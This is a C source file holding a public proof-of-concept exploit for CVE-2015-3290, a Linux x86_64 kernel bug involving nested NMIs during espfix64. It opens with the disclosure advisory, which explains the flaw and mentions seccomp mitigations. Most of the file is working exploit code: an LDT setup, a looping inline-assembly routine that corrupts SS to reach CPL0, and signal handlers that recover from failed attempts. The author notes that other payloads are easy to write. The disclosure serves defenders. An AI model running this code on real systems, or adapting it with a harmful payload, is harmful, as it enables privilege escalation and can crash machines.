/*
> +++++ CVE-2015-3290 +++++
>
> High impact NMI bug on x86_64 systems 3.13 and newer, embargoed.  Also fixed by:
>
> https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=9b6e6a8334d56354853f9c255d1395c2ba570e0a
>
> The other fix (synchronous modify_ldt) does *not* fix CVE-2015-3290.
>
> You can mitigate CVE-2015-3290 by blocking modify_ldt or
> perf_event_open using seccomp.  A fully-functional, portable, reliable
> exploit is privately available and will be published in a week or two.
> *Patch your systems*

And here's a real advisory:

If an NMI returns via espfix64 and is interrupted during espfix64 setup 
by another NMI, the return state is corrupt.  This is exploitable for 
reliable privilege escalation on any Linux x86_64 system in which 
untrusted code can arrange for espfix64 to be invoked and for NMIs to be 
nested.

Glossing over a lot of details, the basic structure of Linux' nested NMI 
handling is:

nmi_handler:
	if (in_nmi) {
		nmi_latched = true;
		return;
	}
	in_nmi = true;
	handle the nmi;
	atomically (this is magic):
		if (nmi_latched) {
			nmi_latched = false;
			start over;
		} else {
			in_nmi = false;
			return and unmask NMIs;
		}

Alas, on x86_64, there is no reasonable way to block NMIs to run the 
atomic part of that pseudocode atomically.  Instead, the entire atomic 
piece is implemented by the single instruction IRET.

But x86_64 is more broken than just that.  The IRET instruction does not 
restore register state correctly [1] when returning to a 16-bit stack 
segment.  x86_64 has a complicated workaround called espfix64.  If 
espfix64 is invoked on return, a well-behaved IRET is emulated by a 
complicated scheme that involves manually switching stacks.  During the 
stack switch, there is a window of approximately 19 instructions between 
the start of espfix64's access to the original stack and when espfix64 
is done with the original stack.  If a nested NMI occurs during this 
window, then the atomic part of the basic nested NMI algorithm is 
observably non-atomic.

Depending on exactly where in this window the nested NMI hits, the 
results vary.  Most nested NMIs will corrupt the return context and 
crash the calling process.  Some are harmless except that the nested NMI 
gets ignored.  There is a two-instruction window in which the return 
context ends up with user-controlled RIP and CS set to __KERNEL_CS.

A careful exploit (attached) can recover from all the crashy failures 
and can regenerate a valid *privileged* state if a nested NMI occurs 
during the two-instruction window.  This exploit appears to work 
reasonably quickly across a fairly wide range of Linux versions.

If you have SMEP, this exploit is likely to panic the system.  Writing
a usable exploit against a SMEP system would be considerably more 
challenging, but it's surely possible.

Measures like UDEREF are unlikely to help, because this bug is outside 
any region that can be protected using paging or segmentation tricks. 
However, recent grsecurity kernels seem to forcibly disable espfix64, so 
they're not vulnerable in the first place.

A couple of notes:

  - This exploit's payload just prints the text "CPL0".  The exploit
    will keep going after printing CPL0 so you can enjoy seeing the
    frequency with which it wins.  Interested parties could easily
    write different payloads.  I doubt that any existing exploit
    mitigation techniques would be useful against this type of
    attack.

  - If you are using a kernel older than v4.1, a 64-bit build of the
    exploit will trigger a signal handling bug and crash.  Defenders
    should not rejoice, because the exploit works fine when build
    as a 32-bit binary or (so I'm told) as an x32 binary.

  - This is the first exploit I've ever written that contains genuine
    hexadecimal code.  The more assembly-minded among you can have
    fun figuring out why :)

[1] By "correctly", I mean that the register state ends up different 
from that which was saved in the stack frame, not that the 
implementation doesn't match the spec in the microcode author's minds. 
The spec is simply broken (differently on AMD and Intel hardware, 
perhaps unsurprisingly.)

--Andy
*/

/*
 * Copyright (c) 2015 Andrew Lutomirski.
 * GPL v2
 *
 * Build with -O2.  Don't use -fno-omit-frame-pointer.
 *
 * Thanks to Petr Matousek for pointing out a bug in the exploit.
 */

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>
#include <asm/ldt.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/processor-flags.h>
#include <setjmp.h>
#include <signal.h>
#include <string.h>
#include <err.h>

/* Abstractions for some 32-bit vs 64-bit differences. */
#ifdef __x86_64__
# define REG_IP REG_RIP
# define REG_SP REG_RSP
# define REG_AX REG_RAX

struct selectors {
	unsigned short cs, gs, fs, ss;
};

static unsigned short *ssptr(ucontext_t *ctx)
{
	struct selectors *sels = (void *)&ctx->uc_mcontext.gregs[REG_CSGSFS];
	return &sels->ss;
}

static unsigned short *csptr(ucontext_t *ctx)
{
	struct selectors *sels = (void *)&ctx->uc_mcontext.gregs[REG_CSGSFS];
	return &sels->cs;
}
#else
# define REG_IP  REG_EIP
# define REG_SP  REG_ESP
# define REG_AX  REG_EAX
# define REG_CR2 (REG_SS + 3)

static greg_t *ssptr(ucontext_t *ctx)
{
	return &ctx->uc_mcontext.gregs[REG_SS];
}

static greg_t *csptr(ucontext_t *ctx)
{
	return &ctx->uc_mcontext.gregs[REG_CS];
}
#endif

static char altstack_data[SIGSTKSZ];

static void sethandler(int sig, void (*handler)(int, siginfo_t *, void *),
		       int flags)
{
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = handler;
	sa.sa_flags = SA_SIGINFO | flags;
	sigemptyset(&sa.sa_mask);
	if (sigaction(sig, &sa, 0))
		err(1, "sigaction");

}

static jmp_buf jmpbuf;
static volatile unsigned long expected_rsp;
static volatile unsigned int cpl0;

static void handler(int sig, siginfo_t *info, void *ctx_void)
{
	ucontext_t *ctx = (ucontext_t*)ctx_void;
	unsigned long sig_err = ctx->uc_mcontext.gregs[REG_ERR];
	unsigned long sig_trapno = ctx->uc_mcontext.gregs[REG_TRAPNO];

	char errdesc[64] = "";
	if (sig_trapno == 14) {
		strcpy(errdesc, " ");
		if (sig_err & (1 << 0))
			strcat(errdesc, "PRESENT ");
		if (sig_err & (1 << 1))
			strcat(errdesc, "WRITE ");
		if (sig_err & (1 << 2))
			strcat(errdesc, "USER ");
		sprintf(errdesc + strlen(errdesc), "at 0x%llX",
			(unsigned long long)ctx->uc_mcontext.gregs[REG_CR2]);
	} else if (sig_err != 0) {
		const char *src = (sig_err & 1) ? " EXT" : "";
		const char *table;
		if ((sig_err & 0x6) == 0x0)
			table = "GDT";
		else if ((sig_err & 0x6) == 0x4)
			table = "LDT";
		else if ((sig_err & 0x6) == 0x2)
			table = "IDT";
		else
			table = "???";

		sprintf(errdesc, " %s%s index %lu, ",
			table, src, sig_err >> 3);
	}

	char trapname[32];
	if (sig_trapno == 13)
		strcpy(trapname, "GP");
	else if (sig_trapno == 11)
		strcpy(trapname, "NP");
	else if (sig_trapno == 12)
		strcpy(trapname, "SS");
	else if (sig_trapno == 14)
		strcpy(trapname, "PF");
	else if (sig_trapno == 32)
		strcpy(trapname, "IRET");  /* X86_TRAP_IRET */
	else
		sprintf(trapname, "%lu", sig_trapno);

	printf("+ State was corrupted: %s #%s(0x%lx%s)\n",
	       (sig == SIGSEGV ? "SIGSEGV" : "SIGTRAP"),
	       trapname, (unsigned long)sig_err,
	       errdesc);

	if (cpl0) {
		printf("  CPL0\n");
		cpl0 = 0;
	}

	if (!(ctx->uc_mcontext.gregs[REG_EFL] & X86_EFLAGS_IF))
		printf("  RFLAGS = 0x%llX (interrupts disabled)\n",
		       (unsigned long long)ctx->uc_mcontext.gregs[REG_EFL]);

	if (ctx->uc_mcontext.gregs[REG_SP] != expected_rsp)
		printf("  RSP = 0x%016llX\n",
		       (unsigned long long)ctx->uc_mcontext.gregs[REG_SP]);

	unsigned short normal_ss;
	asm ("mov %%ss, %0" : "=rm" (normal_ss));
	if (*ssptr(ctx) != 0x7 && *ssptr(ctx) != normal_ss)
		printf("  SS = 0x%hX\n", *ssptr(ctx));

	siglongjmp(jmpbuf, 1);
}
	
static void set_ldt(void)
{
	/* Boring 16-bit data segment. */
	const struct user_desc data_desc = {
		.entry_number    = 0,
		.base_addr       = 0,
		.limit           = 0xfffff,
		.seg_32bit       = 0,
		.contents        = 0, /* Data, expand-up */
		.read_exec_only  = 0,
		.limit_in_pages  = 0,
		.seg_not_present = 0,
		.useable         = 0
	};

	if (syscall(SYS_modify_ldt, 1, &data_desc, sizeof(data_desc)) != 0)
		err(1, "modify_ldt");
}

int main(int argc, char **argv)
{
	static unsigned short orig_ss;	/* avoid RSP references */

	set_ldt();
	sethandler(SIGSEGV, handler, SA_ONSTACK);
	sethandler(SIGTRAP, handler, SA_ONSTACK);

	stack_t stack = {
		.ss_sp = altstack_data,
		.ss_size = SIGSTKSZ,
	};
	if (sigaltstack(&stack, NULL) != 0)
		err(1, "sigaltstack");

	printf("If I produce no output, then either your kernel is okay\n"
	       "or you didn't abuse perf appropriately.\n"
	       "Run me under heavy perf load.  For example:\n"
	       "perf record -g -o /dev/null -e cycles -e instructions -c 10000 %s\n", argv[0]);

	if (sizeof(void *) != 4) {
		printf("*** WARNING *** A 64-bit build of this exploit will not\n"
		       "                work correctly on kernels before v4.1 due to\n"
		       "                a signal handling bug.  Build for 32-bit\n"
		       "                or x32 instead\n");
	}

	sigsetjmp(jmpbuf, 1);

	asm volatile ("mov %%ss, %0" : "=rm" (orig_ss));

	while (1) {
#ifdef __x86_64__
		asm volatile (
			/* A small puzzle for the curious reader. */
			"mov	$2048, %%rbp	\n\t"

			/* Save rsp for diagnostics */
			"mov	%%rsp, %[expected_rsp] \n\t"

			/*
			 * Let 'er rip.
			 */
			"mov	%[ss], %%ss	\n\t"	/* begin corruption */
			"movl	$1000, %%edx	\n\t"
		"1:	 decl	%%edx		\n\t"
			"jnz	1b		\n\t"
			"mov	%%ss, %%eax	\n\t"	/* grab SS to display */

			/* Did we enter CPL0? */
			"mov	%%cs, %%dx	\n\t"
			"testw	$3, %%dx	\n\t"
			"jnz	2f		\n\t"
			"incl	cpl0(%%rip)	\n\t"
			"leaq	3f(%%rip), %%rcx  \n\t"
			"movl	$0x200, %%r11d	\n\t"
			"sysretq		\n\t"
		"2:				\n\t"

			/*
			 * Stop further corruption.  We need to check CPL
			 * first because we need RPL == CPL.
			 */
			"mov	%[orig_ss], %%ss \n\t"	/* end corruption */

			"subq	$128, %%rsp	\n\t"
			"pushfq			\n\t"
			"testl	$(1<<9),(%%rsp)	\n\t"
			"addq	$136, %%rsp	\n\t"
			"jz	3f		\n\t"
			"cmpl	%[ss], %%eax	\n\t"
			"je	4f		\n\t"
		"3:	 int3			\n\t"
		"4:				\n\t"
			: [expected_rsp] "=m" (expected_rsp)
			: [ss] "r" (0x7), [orig_ss] "m" (orig_ss)
			: "rax", "rcx", "rdx", "rbp", "r11", "flags"
			);
#else
		asm volatile (
			/* A small puzzle for the curious reader. */
			"mov	%%ebp, %%esi	\n\t"
			"mov	$2048, %%ebp	\n\t"

			/* Save rsp for diagnostics */
			"mov	%%esp, %[expected_rsp] \n\t"

			/*
			 * Let 'er rip.
			 */
			"mov	%[ss], %%ss	\n\t"	/* begin corruption */
			"movl	$1000, %%edx	\n\t"
		"1:	 .byte 0xff, 0xca	\n\t"	/* decl %edx */
			"jnz	1b		\n\t"
			"mov	%%ss, %%eax	\n\t"	/* grab SS to display */

			/* Did we enter CPL0? */
			"mov	%%cs, %%dx	\n\t"
			"testw	$3, %%dx	\n\t"
			"jnz	2f		\n\t"
			".code64		\n\t"
			"incl	cpl0(%%rip)	\n\t"
			"leaq	3f(%%rip), %%rcx \n\t"
			"movl	$0x200, %%r11d	\n\t"
			"sysretl		\n\t"
			".code32		\n\t"
		"2:				\n\t"

			/*
			 * Stop further corruption.  We need to check CPL
			 * first because we need RPL == CPL.
			 */
			"mov	%[orig_ss], %%ss \n\t"	/* end corruption */

			"pushf			\n\t"
			"testl	$(1<<9),(%%esp)	\n\t"
			"addl	$4, %%esp	\n\t"
			"jz	3f		\n\t"
			"cmpl	%[ss], %%eax	\n\t"
			"je	4f		\n\t"
		"3:	 int3			\n\t"
		"4:	 mov %%esi, %%ebp	\n\t"
			: [expected_rsp] "=m" (expected_rsp)
			: [ss] "r" (0x7), [orig_ss] "m" (orig_ss)
			: "eax", "ecx", "edx", "esi", "flags"
			);
#endif

		/*
		 * If we ended up with IF == 0, there's no easy way to fix
		 * it.  Instead, make frequent syscalls to avoid hanging
		 * the system.
		 */
		syscall(0x3fffffff);
	}
}